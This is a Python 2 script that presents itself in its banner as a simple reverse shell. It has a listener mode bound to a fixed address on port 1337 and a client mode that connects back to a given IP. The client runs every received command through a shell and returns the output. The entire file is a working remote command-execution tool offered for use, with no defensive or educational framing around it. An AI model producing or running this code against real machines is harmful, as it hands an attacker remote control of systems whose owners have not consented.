import socket
import threading
import sys
import re
import os
import subprocess


def CodedBy():
	banner='''
	 __  __           _____          ____    ___        _   _____        
	|  \/  |   ___   |___ /   ___   / ___|  / _ \    __| | |___ /   _ __ 
	| |\/| |  / _ \    |_ \  / __| | |     | | | |  / _` |   |_ \  | '__|
	| |  | | | (_) |  ___) | \__ \ | |___  | |_| | | (_| |  ___) | | |   
	|_|  |_|  \___/  |____/  |___/  \____|  \___/   \__,_| |____/  |_|   

			#######################################
			#     Simple Reverse Shell Script     #
			#          Coded By                   #
			#          Mo3sCod3r                  #
			#     Email: cod3wizard@gmail.com     #
			#######################################
	'''
	print(banner)

def Usage():
	print("")
	print("[+] Usage: ")
	print("\t[+] For A Server: ")
	print("\t\t[+] python "+str(sys.argv[0]))
	print("\t[+] For A Client: ")
	print("\t\t[+] python "+str(sys.argv[0])+" <Server IP Address>"+" "+"<Port>")
	print("\t[+] For Help: ")
	print("\t\t[+] python "+str(sys.argv[0])+" help\n")
	exit(0)	
	
def Client(ipaddr,portno):
	clSock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	clSock.connect((ipaddr,int(portno)))
	while True:
		ReceivedCommand = clSock.recv(1024)
		if str(ReceivedCommand[:2]) == 'cd':
			os.chdir(str(ReceivedCommand[3:]))
			clSock.send("[+] Directory Changed...")
			
		else:
			try:
				if str(ReceivedCommand) == "Exit" or str(ReceivedCommand) == "exit":
					clSock.send("[+] Terminated....")
					clSock.close()
				else:
					cmd = subprocess.Popen(ReceivedCommand, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
					cmdOutputBytes = cmd.stdout.read() + cmd.stderr.read()
					cmdOutputString = str(cmdOutputBytes)
					#print(cmdOutputString)
					clSock.send(str(cmdOutputString))
			except:
				print("[+] Terminated....")
				break
	clSock.close()


def serverConnection():
	CodedBy()
	sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	ip = "192.168.43.75"
	port = 1337
	sock.bind((ip,port))
	sock.listen(1)
	print("######### +=[ Listening On [+] IP: "+ip+" and [+] Port: "+str(port)+" ]=+ ######")
	print("\n[+] Server Runing.. Waiting for Connection.....\n")
	client, addr = sock.accept()
	print("[+] Connection from "+str(addr))

	while True:
		try:
			cmd = raw_input("\nRemote Shell >> ")
			if (cmd == 'exit') or (cmd =='Exit'):
				client.send("[+] Connection closed....")
				break
			if len(str(cmd)) > 0:
				client.send(str(cmd))
				ServerRequest = str(client.recv(1024))
				#print(ServerRequest, end="")
				print(ServerRequest)
		except:
			print("[+] Sorry Some Problem Occured...")
			pass
	client.close()
	sys.exit()
	

def main():
	try:
		if len(sys.argv) == 1:
			serverConnection()
		elif len(sys.argv) == 2 :
			arg = sys.argv[1]
			if arg == "help":
				Usage()
			else:
				Usage()

		elif len(sys.argv) == 3:
			address = sys.argv[1]
			port = sys.argv[2]

			addr = re.findall('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}',address)
			po_corr = re.findall('\d{1,5}',port)
			if address in addr and port in po_corr:
				try:
					Client(address, int(port))
				except:
					print("[-] Connection Failed... Please Check Your Port...")
			else:
				print("[-] Connection Failed...")
				print("[-] Invalid IP Address or Port...")
				exit(0)
		else:
			Usage()

	except KeyboardInterrupt:
		print("[-] Inturrupted By User....")

if __name__ =='__main__':
	main()
